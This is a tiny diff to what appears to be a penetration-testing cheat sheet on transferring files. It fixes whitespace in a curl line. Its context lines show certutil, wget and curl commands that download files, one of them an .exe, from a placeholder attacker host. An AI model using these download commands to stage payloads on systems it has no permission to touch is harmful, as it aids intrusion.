@@ -17,7 +17,7 @@ certutil -urlcache -f http://<IP>:803/ok.exe ok.exe
 -> Linux
 ```
 wget http://<IP>/file
-curl  http://<IP>/file > file
+curl http://<IP>/file > file
 ```
 
 ## SMB Server
